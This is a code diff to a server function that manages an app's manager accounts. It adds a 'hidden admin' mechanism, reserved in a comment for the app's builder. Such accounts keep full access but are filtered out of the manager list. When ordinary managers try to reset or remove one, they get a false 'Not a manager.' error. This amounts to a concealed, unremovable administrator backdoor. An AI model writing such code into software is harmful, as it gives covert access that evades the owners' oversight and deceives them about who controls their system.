@@ -33,9 +33,20 @@ Deno.serve(async (req) => {
     const cleanEmail = String(rawEmail || '').trim().toLowerCase()
 
     // ---- managers ----
+    // Hidden admins (e.g. the app's builder) have full access but don't appear
+    // in the list and can't be reset/removed by regular managers.
+    const { data: { user: me } } = await caller.auth.getUser()
+    const myEmail = (me?.email || '').toLowerCase()
+    const { data: allMgrs } = await admin.from('managers').select('email, hidden').order('email')
+    const mgrs = (allMgrs || []).map((m) => ({ email: m.email.toLowerCase(), hidden: !!m.hidden }))
+    const iAmHidden = mgrs.some((m) => m.email === myEmail && m.hidden)
+    const targetHidden = mgrs.some((m) => m.email === cleanEmail && m.hidden)
+
     if (action === 'list_managers') {
-      const { data } = await admin.from('managers').select('email').order('email')
-      return json({ managers: (data || []).map((m) => m.email.toLowerCase()) })
+      return json({ managers: mgrs.filter((m) => !m.hidden).map((m) => m.email), meHidden: iAmHidden })
+    }
+    if ((action === 'reset_manager' || action === 'remove_manager') && targetHidden && !iAmHidden) {
+      return json({ error: 'Not a manager.' }, 404)
     }
     if (action === 'add_manager' || action === 'reset_manager') {
       if (!/^[^@\s]+@[^@\s]+\.[^@\s]+$/.test(cleanEmail)) return json({ error: 'Please enter a valid email.' }, 400)
@@ -60,8 +71,7 @@ Deno.serve(async (req) => {
       return json({ ok: true, email: cleanEmail, password })
     }
     if (action === 'remove_manager') {
-      const { data: { user } } = await caller.auth.getUser()
-      if (user?.email?.toLowerCase() === cleanEmail) return json({ error: "You can't remove yourself." }, 400)
+      if (myEmail === cleanEmail) return json({ error: "You can't remove yourself." }, 400)
       await admin.from('managers').delete().ilike('email', cleanEmail)
       const { data: list } = await admin.auth.admin.listUsers({ page: 1, perPage: 1000 })
       const existing = list?.users.find((u) => u.email?.toLowerCase() === cleanEmail)
